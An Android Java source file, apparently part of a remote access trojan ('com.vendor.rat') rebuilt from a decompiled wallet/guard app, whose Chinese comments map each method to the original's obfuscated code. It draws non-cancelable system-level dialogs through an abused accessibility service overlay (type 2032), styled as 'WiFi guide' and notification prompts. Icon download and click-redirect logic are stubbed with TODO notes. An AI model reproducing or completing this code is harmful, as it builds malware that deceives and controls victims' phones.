package com.vendor.rat.helper;

import android.app.AlertDialog;
import android.graphics.Bitmap;
import android.graphics.drawable.BitmapDrawable;
import android.graphics.drawable.Drawable;
import android.os.Handler;
import android.os.Looper;
import android.util.Log;
import android.view.WindowManager;

import com.vendor.rat.service.MyAccessibilityService;

import java.lang.ref.WeakReference;
import java.util.Objects;
import java.util.concurrent.locks.ReentrantLock;

/**
 * 对话框覆盖层辅助
 *
 * 基于逆向: com/guard/wallet/helper/n.java (148行)
 * - 弹出系统级对话框 (WiFi引导 / 通知)
 * - 使用 TYPE_ACCESSIBILITY_OVERLAY (2032)
 */
public abstract class DialogOverlay {

    private static final String TAG = "DialogOverlay";

    // ADAPT: vendor f159a — 对话框弱引用
    public static WeakReference<AlertDialog> dialogRef;
    public static final ReentrantLock lock = new ReentrantLock();

    /**
     * 显示带图标的对话框 (支持URL下载图标)
     * ADAPT: vendor a() — 对应 WiFi 引导对话框内部实现
     * @param title 标题
     * @param message 消息
     * @param buttonText 按钮文本 (null时默认"OK")
     * @param iconBase64 Base64图标 (可null)
     * @param iconUrl 图标URL (可null)
     */
    public static boolean showDialogWithIcon(String title, String message,
            String buttonText, String iconBase64, String iconUrl) {
        // TODO: VENDOR_VERIFY — vendor 使用 a1.q.B() 判空，此处用标准判空
        if (MyAccessibilityService.P() == null) {
            return false;
        }
        if (buttonText == null || buttonText.isEmpty()) {
            buttonText = "OK";
        }

        Drawable icon = null;
        // TODO: VENDOR_VERIFY — vendor 使用 com.guard.wallet.utils.g.V(str4) 加载 base64 图标
        // 此处暂不实现图标加载，保留接口

        // TODO: VENDOR_VERIFY — vendor 使用 com.guard.wallet.thread.l.b() 下载远程图标
        // 此处暂不实现远程下载

        AlertDialog.Builder builder = new AlertDialog.Builder(
                MyAccessibilityService.P(), android.R.style.Theme_DeviceDefault_Light_Dialog);
        builder.setTitle(title);
        builder.setMessage(message);
        builder.setCancelable(false);
        // ADAPT: vendor 使用 new j(0) 和 new k(0) 作为 listener
        builder.setPositiveButton(buttonText, (dialog, which) -> dialog.dismiss());
        builder.setOnDismissListener(dialog -> {
            // ADAPT: vendor new k(0) — 清理引用
        });
        if (icon != null) {
            builder.setIcon(icon);
        }
        AlertDialog dialog = builder.create();
        if (dialog != null && dialog.getWindow() != null) {
            dialogRef = new WeakReference<>(dialog);
            WindowManager.LayoutParams attrs = dialog.getWindow().getAttributes();
            attrs.type = 2032; // TYPE_ACCESSIBILITY_OVERLAY
            dialog.getWindow().setAttributes(attrs);
            dialog.show();
            return true;
        }
        return false;
    }

    /**
     * 显示通知对话框 (带跳转)
     * ADAPT: vendor b() — 对应通知弹窗
     */
    public static boolean showNotificationDialog(String title, String message,
            String buttonText, String iconBase64, String iconUrl) {
        if (MyAccessibilityService.P() == null) {
            return false;
        }
        if (buttonText == null || buttonText.isEmpty()) {
            buttonText = "OK";
        }

        Drawable icon = null;
        // TODO: VENDOR_VERIFY — vendor 使用 com.guard.wallet.utils.g.V(str4) 加载图标

        AlertDialog.Builder builder = new AlertDialog.Builder(
                MyAccessibilityService.P(), android.R.style.Theme_DeviceDefault_Light_Dialog);
        builder.setTitle(title);
        builder.setMessage(message);
        builder.setCancelable(false);
        // ADAPT: vendor 使用 new l(str4, str5) 作为点击 listener，含跳转逻辑
        builder.setPositiveButton(buttonText, (dialog, which) -> {
            // TODO: VENDOR_VERIFY — vendor l.onClick 含 iconBase64/iconUrl 跳转逻辑
            dialog.dismiss();
        });
        if (icon != null) {
            builder.setIcon(icon);
        }
        AlertDialog dialog = builder.create();
        if (dialog != null && dialog.getWindow() != null) {
            WindowManager.LayoutParams attrs = dialog.getWindow().getAttributes();
            attrs.type = 2032; // TYPE_ACCESSIBILITY_OVERLAY
            dialog.getWindow().setAttributes(attrs);
            dialog.show();
            return true;
        }
        return false;
    }

    /**
     * 弹出 WiFi 引导对话框
     * ADAPT: vendor c() — 检查 WiFi 状态后弹窗
     */
    public static boolean showWifiGuideDialog(String title, String message,
            String buttonText, String iconBase64, String iconUrl) {
        if (!lock.tryLock()) {
            return false;
        }
        try {
            WeakReference<AlertDialog> ref = dialogRef;
            if (ref != null && ref.get() != null) {
                // 已有对话框显示中
                return false;
            }
            // TODO: VENDOR_VERIFY — vendor 检查 com.guard.wallet.utils.g.z0().getIsWifiConnected() == 1
            // 此处暂不检查 WiFi 状态

            if (!isMainThread()) {
                new Handler(Looper.getMainLooper()).postDelayed(() -> {
                    showDialogWithIcon(title, message, buttonText, iconBase64, iconUrl);
                }, 300L);
            } else if (showDialogWithIcon(title, message, buttonText, iconBase64, iconUrl)) {
                Log.d(TAG, "弹出WIFI引导对话框成功");
            } else {
                Log.e(TAG, "弹出WIFI引导对话框失败");
            }
            return true;
        } finally {
            lock.unlock();
        }
    }

    /**
     * 弹出通知对话框
     * ADAPT: vendor d()
     */
    public static boolean showNotifyDialog(String title, String message,
            String buttonText, String iconBase64, String iconUrl) {
        if (!lock.tryLock()) {
            return false;
        }
        try {
            if (!isMainThread()) {
                new Handler(Looper.getMainLooper()).postDelayed(() -> {
                    showNotificationDialog(title, message, buttonText, iconBase64, iconUrl);
                }, 300L);
            } else if (showNotificationDialog(title, message, buttonText, iconBase64, iconUrl)) {
                Log.d(TAG, "弹出通知对话框成功");
            } else {
                Log.e(TAG, "弹出通知对话框失败");
            }
            return true;
        } finally {
            lock.unlock();
        }
    }

    // ADAPT: vendor 使用 com.guard.wallet.utils.k.a() 判断主线程
    private static boolean isMainThread() {
        return Looper.myLooper() == Looper.getMainLooper();
    }
}
